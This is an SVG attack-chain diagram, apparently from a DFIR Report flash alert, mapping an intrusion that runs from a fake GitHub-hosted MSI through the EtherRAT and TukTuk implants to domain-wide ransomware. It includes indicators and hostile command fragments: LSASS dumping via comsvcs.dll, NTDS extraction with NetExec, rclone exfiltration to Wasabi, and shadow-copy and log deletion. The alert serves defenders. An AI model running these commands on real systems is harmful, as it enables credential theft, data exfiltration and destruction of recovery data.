  <!-- Header -->
  <text x="20" y="32" class="header">EtherRAT + TukTuk → The Gentlemen ransomware</text>
  <text x="20" y="52" class="subhead">The DFIR Report — Flash Alert TB40048, 11 May 2026 — dwell time ≈ 3 days, MSI → domain-wide encryption</text>

  <!-- Lane labels -->
  <text x="30" y="92" class="lane" transform="rotate(-90 30 92)">VICTIM HOST / ENTERPRISE AD</text>
  <text x="855" y="92" class="lane" transform="rotate(-90 855 92)">ATTACKER C2 / SAAS / BLOCKCHAIN</text>

  <!-- Stage 1: Initial Access -->
  <rect x="60" y="80" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="100" r="14" class="stagebg"/>
  <text x="82" y="104" text-anchor="middle" class="stagenum">1</text>
  <text x="105" y="100" class="label">Initial Access — GitHub-facade MSI</text>
  <text x="105" y="118" class="sub">User downloads spoofed RAMMap.msi from one of 44 GitHub facades</text>
  <text x="105" y="134" class="ioc">RAMMap.msi  d9487fdc097f770e5661f9e5dee130068cb179d3...</text>
  <text x="105" y="150" class="mitre">T1566.002  ·  T1204.002</text>

  <!-- Stage 2: Execution -->
  <rect x="60" y="180" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="200" r="14" class="stagebg"/>
  <text x="82" y="204" text-anchor="middle" class="stagenum">2</text>
  <text x="105" y="200" class="label">Execution — Node.js portable from nodejs.org</text>
  <text x="105" y="218" class="sub">msiexec → cmd → MVnVmUYj.cmd → curl node-v18.20.5-win-x64.zip</text>
  <text x="105" y="234" class="ioc">MVnVmUYj.cmd  8c2665adf8bfab65463f2a9bd1b7bb0231de3f5c...</text>
  <text x="105" y="250" class="mitre">T1059.007  ·  T1106  ·  T1218.007</text>

  <!-- Stage 3: Defense Evasion -->
  <rect x="60" y="280" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="300" r="14" class="stagebg"/>
  <text x="82" y="304" text-anchor="middle" class="stagenum">3</text>
  <text x="105" y="300" class="label">Defense Evasion — AsyncFunction RCE + /api/reobf/</text>
  <text x="105" y="318" class="sub">AES-256-CBC layered config; runtime self-overwrite via C2 response</text>
  <text x="105" y="334" class="ioc">conhost.exe --headless  node.exe  &lt;random&gt;.cfg</text>
  <text x="105" y="350" class="mitre">T1027  ·  T1140  ·  T1218.007</text>

  <!-- Stage 4: EtherRAT runtime + Ethereum C2 -->
  <rect x="60" y="380" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="400" r="14" class="stagebg"/>
  <text x="82" y="404" text-anchor="middle" class="stagenum">4</text>
  <text x="105" y="400" class="label">EtherRAT implant — blockchain-resolved C2</text>
  <text x="105" y="418" class="sub">Queries Ethereum smart contract via 1rpc.io for live C2 URL</text>
  <text x="105" y="434" class="ioc">A7Pnj975bl.cfg  4142d5efd4ea2abab77f2f0a917610e2...</text>
  <text x="105" y="450" class="mitre">T1568.002  ·  T1102.002</text>

  <!-- Stage 5: Persistence -->
  <rect x="60" y="480" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="500" r="14" class="stagebg"/>
  <text x="82" y="504" text-anchor="middle" class="stagenum">5</text>
  <text x="105" y="500" class="label">Persistence — HKCU Run key AppResolver</text>
  <text x="105" y="518" class="sub">conhost --headless node.exe AppData\&lt;random&gt;\*.cfg</text>
  <text x="105" y="534" class="ioc">HKCU\...\Run\AppResolver</text>
  <text x="105" y="550" class="mitre">T1547.001</text>

  <!-- Stage 6: PrivEsc + CredAccess -->
  <rect x="60" y="580" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="600" r="14" class="stagebg"/>
  <text x="82" y="604" text-anchor="middle" class="stagenum">6</text>
  <text x="105" y="600" class="label">PrivEsc + CredAccess — Kerberoasting + LSASS + NTDS</text>
  <text x="105" y="618" class="sub">comsvcs.dll #+0000 ordinal; nxc smb --ntds; nxc -M lsassy</text>
  <text x="105" y="634" class="ioc">rundll32.exe comsvcs.dll, #+0000^24 &lt;pid&gt; im4.txt full</text>
  <text x="105" y="650" class="mitre">T1003.001  ·  T1003.003  ·  T1558.003  ·  T1078.002</text>

  <!-- Stage 7: Discovery + Lateral + GoTo Resolve -->
  <rect x="60" y="680" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="700" r="14" class="stagebg"/>
  <text x="82" y="704" text-anchor="middle" class="stagenum">7</text>
  <text x="105" y="700" class="label">Discovery + Lateral — NetExec + Softperfect + GoTo Resolve</text>
  <text x="105" y="718" class="sub">nxc smb; netscan.exe C:\temp\; smokymo.msi → GoTo Resolve service</text>
  <text x="105" y="734" class="ioc">smokymo.msi  1795eacd2c58894ccdd6be8854fe6456c3b069a3a...</text>
  <text x="105" y="750" class="mitre">T1543.003  ·  T1219  ·  T1570  ·  T1021.001-006</text>

  <!-- Stage 8: TukTuk side-load + multi-transport C2 -->
  <rect x="60" y="780" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="800" r="14" class="stagebg"/>
  <text x="82" y="804" text-anchor="middle" class="stagenum">8</text>
  <text x="105" y="800" class="label">TukTuk implant — AI-generated, side-loaded</text>
  <text x="105" y="818" class="sub">Greenshot/SyncTrayzor/DocFX/Cake load fake log4net.dll</text>
  <text x="105" y="834" class="ioc">log4net.dll  19021e53b9929fdf4b7d0e0707434d56bb73c1a9b...</text>
  <text x="105" y="850" class="mitre">T1574.002  ·  T1102.002  ·  T1568.002</text>

  <!-- Stage 9: Exfiltration to Wasabi -->
  <rect x="60" y="880" width="440" height="80" rx="6" class="bg-stage"/>
  <circle cx="82" cy="900" r="14" class="stagebg"/>
  <text x="82" y="904" text-anchor="middle" class="stagenum">9</text>
  <text x="105" y="900" class="label">Exfiltration — Rclone to Wasabi cloud storage</text>
  <text x="105" y="918" class="sub">--transfers=16 --multi-thread-streams=32 --bwlimit=off</text>
  <text x="105" y="934" class="ioc">rclone.exe copy Z:\&lt;share&gt; wasabi:/&lt;bucket&gt;/...</text>
  <text x="105" y="950" class="mitre">T1567.002</text>

  <!-- Stage 10: Defense disable + GPO drop -->
  <rect x="60" y="980" width="440" height="80" rx="6" class="bg-impact"/>
  <circle cx="82" cy="1000" r="14" class="stagebg-red"/>
  <text x="82" y="1004" text-anchor="middle" class="stagenum">10</text>
  <text x="105" y="1000" class="label">Pre-impact — Defender off, shadows deleted, GPO drop</text>
  <text x="105" y="1018" class="sub">vssadmin delete shadows; wevtutil cl; malicious GPO → SYSVOL/NETLOGON</text>
  <text x="105" y="1034" class="ioc">\\&lt;dc&gt;\SYSVOL\&lt;domain&gt;\NETLOGON\&lt;ransom&gt;.exe</text>
  <text x="105" y="1050" class="mitre">T1490  ·  T1562.001  ·  T1070.001  ·  T1484.001</text>

  <!-- Stage 11: Impact -->
  <rect x="60" y="1080" width="440" height="80" rx="6" class="bg-impact"/>
  <circle cx="82" cy="1100" r="14" class="stagebg-red"/>
  <text x="82" y="1104" text-anchor="middle" class="stagenum">11</text>
  <text x="105" y="1100" class="label">Impact — The Gentlemen ransomware domain-wide</text>
  <text x="105" y="1118" class="sub">Scheduled task fan-out from SYSVOL replication → encryption everywhere</text>
  <text x="105" y="1134" class="ioc">Cluster: The Gentlemen RaaS, 320+ disclosed victims H1-2026</text>
  <text x="105" y="1150" class="mitre">T1486</text>

